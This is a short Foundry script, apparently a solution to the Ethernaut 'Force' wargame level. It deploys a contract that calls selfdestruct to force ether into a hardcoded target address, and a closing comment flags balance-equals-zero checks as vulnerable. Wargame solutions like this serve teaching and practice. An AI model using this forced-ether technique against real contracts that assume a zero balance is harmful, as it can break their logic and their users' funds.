// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";
import {Force} from "../src/EthernautForce.sol";

contract ForceSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new SelfDestructContract{value: 0.00001 ether}(
            payable(0xf3226c377f4192CC0599055eae0A2dd9bC659E26)
        );
        vm.stopBroadcast();
    }
}

contract SelfDestructContract {
    constructor(address payable forceAddress) payable {
        selfdestruct(forceAddress);
    }
}

/* address(this).balance == 0 is a vulnerable contract logic */
